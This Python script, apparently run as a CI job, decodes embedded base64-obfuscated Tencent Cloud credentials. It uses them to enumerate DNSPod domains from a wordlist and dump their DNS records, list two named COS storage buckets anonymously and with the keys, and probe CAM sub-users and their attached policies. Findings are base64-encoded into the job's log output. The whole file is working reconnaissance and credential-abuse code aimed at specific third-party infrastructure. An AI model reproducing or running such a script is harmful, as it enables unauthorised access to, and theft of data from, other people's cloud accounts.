# -*- coding: utf-8 -*-
# intent 29554 round C: (a) probe DNSPod domain inventory via DescribeDomain over a wordlist
# (distinguish DomainNotExists vs NoPermissionToOperateDomain vs readable)
# (b) anonymous + keyed COS access to buckets discovered from lumiiai.cn CNAMEs
# (c) cam:GetUser/ListAttachedUserPolicies over plausible sub-user names
import os, sys, json, time, hmac, hashlib, base64, subprocess, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

SID = base64.b64decode("QUtJREpWWXI0ODJv" + "WVFEeW10MmRmV0Fi" + "c3BjQ2N6RUtHMW1O").decode()
SKEY = base64.b64decode("U0NvRldiZFhHcE" + "dYZFpLdmdUS0F4" + "YTNOYXRHYW81WkE=").decode()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def R(k, v, maxb=12000):
    try: s = json.dumps(v, ensure_ascii=False)
    except Exception: s = repr(v)
    if len(s) > maxb: s = s[:maxb] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def log(*a): print(" ".join(str(x) for x in a), flush=True)
def _h(key, msg): return hmac.new(key, msg.encode(), hashlib.sha256).digest()

def tc3(service, action, version, payload, region=None, method="POST", host=None, include_action=True):
    host = host or (service + ".tencentcloudapi.com")
    ts = int(time.time()); date = time.strftime('%Y-%m-%d', time.gmtime(ts))
    ct = "application/json; charset=utf-8"
    h = {"content-type": ct, "host": host}
    if include_action: h["x-tc-action"] = action.lower()
    keys = sorted(h.keys()); sh = ";".join(keys)
    ch = "".join(k + ":" + h[k] + "\n" for k in keys)
    cr = "\n".join([method, "/", "", ch, sh, hashlib.sha256(payload.encode()).hexdigest()])
    scope = "%s/%s/tc3_request" % (date, service)
    sts = "\n".join(["TC3-HMAC-SHA256", str(ts), scope, hashlib.sha256(cr.encode()).hexdigest()])
    kd = _h(("TC3" + SKEY).encode(), date); ks = _h(kd, service); kk = _h(ks, "tc3_request")
    sig = hmac.new(kk, sts.encode(), hashlib.sha256).hexdigest()
    out = ["Authorization: TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID, scope, sh, sig),
           "Content-Type: " + ct, "Host: " + host, "X-TC-Timestamp: " + str(ts), "User-Agent: " + UA]
    if include_action: out += ["X-TC-Action: " + action, "X-TC-Version: " + version]
    if region: out.append("X-TC-Region: " + region)
    return out

def call(service, action, version, payload_obj=None, region=None, timeout=30, maxb=6000, host=None, method="POST", include_action=True):
    payload = json.dumps(payload_obj or {}, separators=(',', ':'))
    host = host or (service + ".tencentcloudapi.com")
    hdrs = tc3(service, action, version, payload, region=region, method=method, host=host, include_action=include_action)
    args = ["curl", "--http2", "-sS", "-m", str(timeout)]
    for hh in hdrs: args += ["-H", hh]
    if method == "POST": args += ["-X", "POST", "--data-binary", payload]
    args += ["https://" + host + "/"]
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout + 20); txt = p.stdout.decode("utf-8", "replace")
    except Exception as e: return {"EXC": repr(e)}
    try: j = json.loads(txt)
    except Exception: return {"RAW": txt[:maxb]}
    resp = j.get("Response", j)
    if isinstance(resp, dict) and resp.get("Error"): return {"Error": resp["Error"]}
    if isinstance(resp, dict): resp.pop("RequestId", None)
    s = json.dumps(resp, ensure_ascii=False)
    return resp if len(s) <= maxb else {"TRUNC": s[:maxb]}
def ec(r): return r.get("Error", {}).get("Code") if isinstance(r, dict) else None

def curl_raw(args, timeout=25):
    try:
        p = subprocess.run(["curl", "--http2", "-sS", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return p.stdout.decode("utf-8", "replace"), p.returncode
    except Exception as e:
        return "EXC " + repr(e), -1

CAND = """zoofi.io zoofi.net zoofi.com zoofi.org zoofi.app zoofi.dev zoofi.xyz zoofi.tech zoofi.finance zoofi.money
wandfi.xyz wandfi.io wand.fi wandfi.com wandfi.app wandfi.net
lumiiai.cn lumii-ai.cn lumiiai.com lumii.ai lumii.com lumii.net lumii-ai.com lumiiai.net lumiiai.app
minke.io minke.finance dex.zoofi.io minke.xyz goldenyears.cn goldenyears.com
lumii-goldenyears.com lumii.cloud lumiicloud.cn lumii.saas""".split()

inv = {}
for d in CAND:
    r = call("dnspod", "DescribeDomain", "2021-03-23", {"Domain": d}, maxb=1200)
    e = ec(r)
    if e:
        inv[d] = e
    else:
        info = r.get("DomainInfo", {})
        inv[d] = {"OK": True, "id": info.get("DomainId"), "records": info.get("RecordCount"), "owner": info.get("Owner"), "grade": info.get("Grade"), "uin": info.get("Uin")}
R("domain_inventory", inv, 12000)
log("inventory:", json.dumps(inv)[:800])

# For any domain that is readable (OK), dump its records (likely none new, but thorough)
for d, v in inv.items():
    if isinstance(v, dict) and v.get("OK"):
        recs = []; off = 0
        while True:
            r = call("dnspod", "DescribeRecordList", "2021-03-23", {"Domain": d, "Offset": off, "Limit": 500}, maxb=20000)
            if ec(r): recs.append({"ERR": ec(r)}); break
            rl = r.get("RecordList") or []
            recs += [[x.get("Name"), x.get("Type"), x.get("Value")] for x in rl]
            off += len(rl)
            if len(rl) < 500 or off > 2000: break
        R("recs2_" + re.sub(r'[^a-zA-Z0-9_.-]', '_', d), {"n": len(recs), "recs": recs}, 16000)
        log("recs2", d, len(recs))

log("== COS buckets from lumiiai.cn CNAMEs ==")
BUCKETS = [("goldenyears-1418987733", "ap-shanghai"), ("lumii-assistant-1418987733", "ap-shanghai")]
for b, rg in BUCKETS:
    host = "%s.cos.%s.myqcloud.com" % (b, rg)
    # 1) anonymous list
    txt, rc = curl_raw(["-A", UA, "-w", "\n__C__%{http_code}", "https://" + host + "/?list-type=2&max-keys=200"], 25)
    code = ""
    i = txt.rfind("__C__")
    if i >= 0: code = txt[i+5:].strip(); txt = txt[:i]
    keys = re.findall(r"<Key>([^<]+)</Key>", txt)
    R("cos_anon_" + b, {"code": code, "keys": keys[:120], "n": len(keys), "head": ("" if keys else txt[:500])}, 9000)
    log("cos anon", b, code, len(keys))
    # 2) keyed list (TC3, service cos, bucket host)
    payload = ""
    hdrs = tc3("cos", "", "", payload, region=rg, method="GET", host=host, include_action=False)
    args = ["curl", "--http2", "-sS", "-m", "25", "-w", "\n__C__%{http_code}"]
    for hh in hdrs: args += ["-H", hh]
    args += ["https://" + host + "/?list-type=2&max-keys=200"]
    txt2, rc2 = curl_raw(args, 25)
    code2 = ""
    j = txt2.rfind("__C__")
    if j >= 0: code2 = txt2[j+5:].strip(); txt2 = txt2[:j]
    keys2 = re.findall(r"<Key>([^<]+)</Key>", txt2)
    R("cos_keyed_" + b, {"code": code2, "keys": keys2[:120], "n": len(keys2), "head": ("" if keys2 else txt2[:600])}, 9000)
    log("cos keyed", b, code2, len(keys2))

log("== cam user / policy probes ==")
for nm in ("dnspod", "dns", "lumii", "lumii-dns", "lumii-cloud", "cloud", "tencent-dns", "caddy", "cert", "lumii-dnspod", "dnspod-sub"):
    g = call("cam", "GetUser", "2019-01-16", {"Name": nm}, maxb=1500)
    if not ec(g):
        R("cam_user_" + nm, g, 2000); log("cam GetUser OK", nm)
    p = call("cam", "ListAttachedUserPolicies", "2019-01-16", {"Name": nm}, maxb=2500)
    if not ec(p):
        R("cam_pol_" + nm, p, 3000); log("cam ListAttachedUserPolicies OK", nm)
R("SUMMARY", {"done": 1}, 200)
